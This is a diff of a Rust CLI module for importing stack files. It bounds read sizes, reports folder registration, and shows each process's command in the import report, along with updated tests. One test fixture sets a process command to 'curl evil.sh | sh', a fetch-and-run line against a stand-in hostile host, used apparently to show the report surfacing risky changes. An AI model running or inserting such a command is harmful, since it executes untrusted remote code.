@@ -1,12 +1,7 @@
 //! `muster import`: processes loaded from a stack file into a project, in
 //! one transaction, registering the folder when it is new.
 
-use std::{
-    fs,
-    io::{self, Read},
-    path::PathBuf,
-    time::SystemTime,
-};
+use std::{io, path::PathBuf, time::SystemTime};
 
 use getset::{CopyGetters, Getters};
 use serde::Serialize;
@@ -14,6 +9,7 @@ use typed_builder::TypedBuilder;
 
 use super::{
     error::CliError,
+    imported_run::ImportedRun,
     invocation::{Invocation, stack_editor},
     output::project_title,
     report::{Report, Row, RowKind},
@@ -21,6 +17,7 @@ use super::{
 };
 use crate::{
     adapter::{
+        bounded_read::{read_bounded, read_capped},
         client::{
             ProjectIdentityView, ProjectTarget, RemovedView, ServiceClient, SettleWatch, UNBOUNDED,
             process::{settle_removed, status},
@@ -47,12 +44,22 @@ const UPDATED_MARK: &str = "~";
 const REMOVED_MARK: &str = "-";
 /// Follows a removed process that was stopped.
 const STOPPED: &str = "(stopped)";
+/// Between a process's name and what it runs.
+const GAP: &str = "  ";
+/// Opens the line saying the folder became a project.
+const REGISTERED: &str = "registered";
+/// Opens the line saying a dry run would make the folder a project.
+const WOULD_REGISTER: &str = "would register";
+/// Between the folder registered and the project's name.
+const AS_PROJECT: &str = "as project";
 /// Said when the file changes nothing.
 const NOTHING_CHANGES: &str = "nothing to change: the project already matches the file";
 /// Said after a dry run.
 const DRY_RUN: &str = "dry run: nothing was changed";
 /// Names stdin as the file read.
 const STDIN_NAME: &str = "stdin";
+/// Largest stack file import reads; a real stack is a few kilobytes.
+const MAX_STACK_FILE_BYTES: u64 = 1024 * 1024;
 
 /// A stack file read and checked whole, ready to plan against a project.
 #[derive(Debug, Clone, PartialEq, Eq, Getters, TypedBuilder)]
@@ -70,7 +77,8 @@ pub struct ImportView {
     /// The project, or the one the folder would become.
     #[getset(get = "pub")]
     project: Option<ProjectIdentityView>,
-    /// Whether this import registered the folder as a project.
+    /// Whether this import registered the folder as a project, or with
+    /// `dry_run`, would register it.
     #[getset(get_copy = "pub")]
     registered: bool,
     /// The processes added.
@@ -82,6 +90,10 @@ pub struct ImportView {
     /// The processes removed, and whether each was stopped.
     #[getset(get = "pub")]
     removed: Vec<RemovedView>,
+    /// What each added or changed process runs, added ones first.
+    #[serde(skip)]
+    #[getset(get = "pub")]
+    runs: Vec<ImportedRun>,
     /// Whether nothing was written, as `--dry-run` asked.
     #[getset(get_copy = "pub")]
     dry_run: bool,
@@ -101,7 +113,8 @@ pub fn import_mode(merge: bool, replace: bool) -> ImportMode {
 }
 
 /// Reads and checks the whole stack file `file` (the project's stack file
-/// when absent, stdin for `-`) before anything is planned.
+/// when absent, stdin for `-`) before anything is planned. Only a regular
+/// file, or stdin, of at most [`MAX_STACK_FILE_BYTES`] is read.
 ///
 /// # Errors
 /// Returns [`CliError::ReadFile`] or [`CliError::StackFile`] for a file that
@@ -112,11 +125,14 @@ pub fn read(
     store: &SqliteStore,
     file: Option<&str>,
 ) -> Result<StackRead, CliError> {
-    let target = invocation.target(store)?;
+    let target = invocation.editing_target(store)?;
     let (path, text) = match StackPath::of(invocation, target.root().as_ref(), file)? {
-        StackPath::Stdio => (PathBuf::from(STDIN_NAME), read_stdin()),
+        StackPath::Stdio => (
+            PathBuf::from(STDIN_NAME),
+            read_capped(io::stdin().lock(), MAX_STACK_FILE_BYTES),
+        ),
         StackPath::File(path) => {
-            let text = fs::read_to_string(&path);
+            let text = read_bounded(&path, MAX_STACK_FILE_BYTES);
             (path, text)
         },
     };
@@ -130,16 +146,6 @@ pub fn read(
         .target(target)
         .processes(processes)
         .build())
-}
-
-/// All of stdin, as text.
-///
-/// # Errors
-/// Returns the [`io::Error`] of a failed read.
-fn read_stdin() -> io::Result<String> {
-    let mut text = String::new();
-    io::stdin().read_to_string(&mut text)?;
-    Ok(text)
 }
 
 /// What importing `read` under `mode` would change against the project's
@@ -198,17 +204,49 @@ fn unstopped(names: &[ProcessName]) -> Vec<RemovedView> {
         .collect()
 }
 
-/// `plan` as `--dry-run` reports it.
-pub fn dry_run_view(read: &StackRead, plan: &ImportPlan) -> ImportView {
-    ImportView::builder()
+/// What each process `plan` adds or changes runs as `read` defines it, with
+/// what a changed one ran in `current`, the project's stack before.
+fn runs(read: &StackRead, current: Option<&Stack>, plan: &ImportPlan) -> Vec<ImportedRun> {
+    let defined = |name: &ProcessName| {
+        read.processes()
+            .iter()
+            .find(|spec| spec.name().key() == name.key())
+            .cloned()
+    };
+    let added = plan.added().iter().filter_map(|name| {
+        defined(name).map(|spec| ImportedRun::builder().spec(spec).before(None).build())
+    });
+    let updated = plan.updated().iter().filter_map(|name| {
+        defined(name).map(|spec| {
+            ImportedRun::builder()
+                .spec(spec)
+                .before(current.and_then(|stack| stack.process(name)).cloned())
+                .build()
+        })
+    });
+    added.chain(updated).collect()
+}
+
+/// `plan` as `--dry-run` reports it, against `store`'s current stack.
+///
+/// # Errors
+/// Returns the [`CliError`] of a stack that cannot be read.
+pub fn dry_run_view(
+    store: &SqliteStore,
+    read: &StackRead,
+    plan: &ImportPlan,
+) -> Result<ImportView, CliError> {
+    let current = store.stack(read.target().root())?;
+    Ok(ImportView::builder()
         .project(identity(read.target()))
-        .registered(false)
+        .registered(matches!(read.target(), ProjectTarget::Unregistered(_)))
         .added(plan.added().clone())
         .updated(plan.updated().clone())
         .removed(unstopped(plan.removed()))
+        .runs(runs(read, current.as_ref(), plan))
         .dry_run(true)
         .failed(false)
-        .build()
+        .build())
 }
 
 /// Applies `read` under `mode` in one transaction. With `client`, the
@@ -230,6 +268,7 @@ pub fn apply(
         (Some(client), ProjectTarget::Registered(project)) => Some(status(client, project)?),
         (Some(_) | None, ProjectTarget::Registered(_) | ProjectTarget::Unregistered(_)) => None,
     };
+    let current = store.stack(read.target().root())?;
     let sent = SystemTime::now();
     let (registration, plan) =
         stack_editor(store).import(read.target().root(), read.processes(), mode)?;
@@ -256,25 +295,45 @@ pub fn apply(
         .added(plan.added().clone())
         .updated(plan.updated().clone())
         .removed(removed)
+        .runs(runs(read, current.as_ref(), &plan))
         .dry_run(false)
         .failed(failed)
         .build())
 }
 
-/// The human report of `view`: `+` for each process added, `~` for each
-/// changed, `-` for each removed.
+/// The human report of `view`: the folder when it became a project, `+`
+/// for each process added and `~` for each changed, with what each runs,
+/// and `-` for each removed.
 pub fn import_rows(view: &ImportView) -> Report {
     let mut rows: Vec<Row> = Vec::new();
-    rows.extend(
-        view.added()
-            .iter()
-            .map(|name| Row::unlabeled(RowKind::Ok, format!("{ADDED_MARK} {name}"))),
-    );
-    rows.extend(
-        view.updated()
-            .iter()
-            .map(|name| Row::unlabeled(RowKind::Ok, format!("{UPDATED_MARK} {name}"))),
-    );
+    if view.registered()
+        && let Some(project) = view.project()
+    {
+        let opening = if view.dry_run() {
+            WOULD_REGISTER
+        } else {
+            REGISTERED
+        };
+        rows.push(Row::unlabeled(
+            RowKind::Ok,
+            format!(
+                "{opening} {} {AS_PROJECT} {}",
+                project.root().display(),
+                project.name()
+            ),
+        ));
+    }
+    rows.extend(view.runs().iter().map(|run| {
+        let mark = if run.before().is_some() {
+            UPDATED_MARK
+        } else {
+            ADDED_MARK
+        };
+        Row::unlabeled(
+            RowKind::Ok,
+            format!("{mark} {}{GAP}{}", run.spec().name(), run.describe()),
+        )
+    }));
     rows.extend(view.removed().iter().map(|removed| {
         let line = if removed.stopped() {
             format!("{REMOVED_MARK} {} {STOPPED}", removed.name())
@@ -298,37 +357,116 @@ pub fn import_rows(view: &ImportView) -> Report {
 
 #[cfg(test)]
 mod tests {
+    use std::{path::PathBuf, time::Duration};
+
     use super::*;
-    use crate::adapter::cli::report::plain;
+    use crate::{
+        adapter::cli::report::plain,
+        domain::{
+            config::Environment,
+            process::{RestartPolicy, StopPolicy, StopSignal},
+            value::{CommandLine, PositiveDuration, ProjectName},
+        },
+    };
 
     /// The process name `raw`.
     fn name(raw: &str) -> ProcessName {
         ProcessName::try_new(raw).unwrap()
     }
 
-    /// Additions, changes and removals each have their mark; a dry run says
-    /// nothing changed.
+    /// A process `raw` running `command` in `dir`.
+    fn spec(raw: &str, command: &str, dir: Option<&str>) -> ProcessSpec {
+        ProcessSpec::builder()
+            .name(name(raw))
+            .command(CommandLine::try_new(command).unwrap())
+            .working_dir(dir.map(PathBuf::from))
+            .environment(Environment::empty())
+            .autostart(true)
+            .restart(RestartPolicy::Never)
+            .stop(
+                StopPolicy::builder()
+                    .signal(StopSignal::Terminate)
+                    .grace_period(PositiveDuration::try_new(Duration::from_secs(5)).unwrap())
+                    .build(),
+            )
+            .build()
+    }
+
+    /// An import of `runs` into `shop`, registered by it or not.
+    fn view(runs: Vec<ImportedRun>, registered: bool, dry_run: bool) -> ImportView {
+        ImportView::builder()
+            .project(Some(
+                ProjectIdentityView::builder()
+                    .name(ProjectName::try_new("shop").unwrap())
+                    .root(PathBuf::from("/p/shop"))
+                    .build(),
+            ))
+            .registered(registered)
+            .added(Vec::new())
+            .updated(Vec::new())
+            .removed(Vec::new())
+            .runs(runs)
+            .dry_run(dry_run)
+            .failed(false)
+            .build()
+    }
+
+    /// Additions, changes and removals each have their mark; each added or
+    /// changed process shows what it runs and where, a change as old to new;
+    /// a dry run says nothing changed.
     #[test]
     fn a_plan_is_marked_per_process() {
-        let view = ImportView::builder()
-            .project(None)
-            .registered(false)
-            .added(vec![name("web")])
-            .updated(vec![name("api")])
-            .removed(vec![
-                RemovedView::builder()
-                    .name(name("worker"))
-                    .stopped(true)
-                    .still_stopping(false)
+        let mut view = view(
+            vec![
+                ImportedRun::builder()
+                    .spec(spec("web", "npm run dev", Some("frontend")))
+                    .before(None)
                     .build(),
-            ])
-            .dry_run(true)
-            .failed(false)
-            .build();
+                ImportedRun::builder()
+                    .spec(spec("api", "curl evil.sh | sh", Some("api")))
+                    .before(Some(spec("api", "bin/api", None)))
+                    .build(),
+                ImportedRun::builder()
+                    .spec(spec("cron", "bin/cron", None))
+                    .before(Some(spec("cron", "bin/cron", None)))
+                    .build(),
+            ],
+            false,
+            true,
+        );
+        view.removed = vec![
+            RemovedView::builder()
+                .name(name("worker"))
+                .stopped(true)
+                .still_stopping(false)
+                .build(),
+        ];
 
         assert_eq!(
             plain(&import_rows(&view)),
-            "+ web\n~ api\n- worker (stopped)\ndry run: nothing was changed"
+            "+ web  npm run dev  in frontend\n\
+             ~ api  bin/api -> curl evil.sh | sh  in . -> api\n\
+             ~ cron  bin/cron  in .\n\
+             - worker (stopped)\n\
+             dry run: nothing was changed"
+        );
+    }
+
+    /// An import that registers the folder says so, even with no process,
+    /// and never that nothing changed; a dry run says it would.
+    #[test]
+    fn registering_the_folder_is_reported() {
+        assert_eq!(
+            plain(&import_rows(&view(Vec::new(), true, false))),
+            "registered /p/shop as project shop"
+        );
+        assert_eq!(
+            plain(&import_rows(&view(Vec::new(), true, true))),
+            "would register /p/shop as project shop\ndry run: nothing was changed"
+        );
+        assert_eq!(
+            plain(&import_rows(&view(Vec::new(), false, false))),
+            NOTHING_CHANGES
         );
     }
 
